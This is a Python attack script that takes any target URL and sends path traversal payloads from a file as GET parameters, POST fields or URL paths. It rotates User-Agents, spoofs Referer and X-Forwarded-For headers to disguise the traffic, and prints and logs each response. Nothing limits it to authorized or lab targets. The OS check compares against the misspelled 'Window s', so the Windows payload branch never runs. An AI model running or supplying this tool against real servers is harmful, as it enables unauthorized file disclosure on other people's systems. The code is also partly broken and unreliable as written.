import requests
import random
import os
import datetime

# List of multiple User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

# Function to read payloads from a text file
def load_payloads(file_path):
    if not os.path.exists(file_path):
        print(f"[!] File {file_path} not found!")
        return []
    
    with open(file_path, "r", encoding="utf-8") as file:
        return [line.strip() for line in file if line.strip()]

# Logging function to file
def log_result(log_file, message):
    with open(log_file, "a", encoding="utf-8") as file:
        file.write(f"{datetime.datetime.now()} - {message}\n")

# Function to detect OS type of the server
def detect_server_os(target_url):
    print("[*] Detecting server operating system...\n")
    try:
        response = requests.get(target_url, timeout=10)
        server_header = response.headers.get("Server", "").lower()
        
        if "windows" in server_header or "microsoft-iis" in server_header:
            print("[+] Server detected as Windows-based (IIS).")
            return "Windows"
        elif "apache" in server_header or "nginx" in server_header:
            print("[+] Server detected as Linux-based (Apache/Nginx).")
            return "Linux"
        else:
            print("[?] Unable to determine OS, assuming Linux.")
            return "Linux"
    except requests.exceptions.RequestException as e:
        print(f"[!] Error detecting server OS: {e}")
        return "Unknown"

# Path Traversal Test Function
def test_path_traversal(target_url, param, method, payload_file, log_file):
    print(f"[*] Testing for Path Traversal vulnerability on {target_url} with method {method}...\n")
    
    # Loading payloads from file
    payloads = load_payloads(payload_file)
    if not payloads:
        print("[!] The payload list is empty.")
        return
    
    for payload in payloads:
        # Randomly selecting a User-Agent
        random_user_agent = random.choice(user_agents)
        # Setting up fake headers
        headers = {
            "User-Agent": random_user_agent,
            "Referer": "https://www.google.com/",
            "X-Forwarded-For": "192.168.1.100"
        }

        try:
            if param:
                if method.upper() == "GET":
                    url = f"{target_url}?{param}={payload}"
                    print(f"\n[>>] Sending GET request with payload: {payload}")
                    response = requests.get(url, headers=headers, timeout=15)
                elif method.upper() == "POST":
                    url = target_url
                    data = {param: payload}
                    print(f"\n[>>] Sending POST request with payload: {payload}")
                    response = requests.post(url, headers=headers, data=data, timeout=15)
                else:
                    print("[!] Invalid method! Only GET or POST is allowed.")
                    return
            else:
                # If no parameter is provided, send request directly
                url = f"{target_url}/{payload}"
                print(f"\n[>>] Sending GET request with payload in path: {payload}")
                response = requests.get(url, headers=headers, timeout=15)

            # Print response status code
            print(f"[+] Response Status Code: {response.status_code}")

            # Print response headers
            print("\n[+] Response Headers:")
            for key, value in response.headers.items():
                print(f"  {key}: {value}")

            # Print response body preview
            print("\n[+] Response Body (First 500 chars):")
            print(response.text[:500])  

            # Log result
            msg = f"[+] Payload: {payload} | User-Agent: {random_user_agent} | Status Code: {response.status_code}"
            log_result(log_file, msg)

        except requests.exceptions.RequestException as e:
            msg = f"[!] Error sending request: {e}"
            print(msg)
            log_result(log_file, msg)

if __name__ == "__main__":
    target = input("Please enter the target URL (e.g., https://example.com/download.php): ").strip()
    
    # Detect server OS
    server_os = detect_server_os(target)

    # Suggesting proper payload file based on OS
    if server_os == "Window s":
        payload_file = input("Enter the Windows payload file (default: windows_payloads.txt): ").strip() or "windows_payloads.txt"
    else:
        payload_file = input("Enter the Linux payload file (default: linux_payloads.txt): ").strip() or "linux_payloads.txt"

    method = input("HTTP method (GET/POST): ").strip().upper()
    param = input("Enter parameter name (leave empty if none): ").strip()
    log_file = "scan_results.log"

    test_path_traversal(target, param, method, payload_file, log_file)

    print(f"\n📄 Logs saved in {log_file}.")
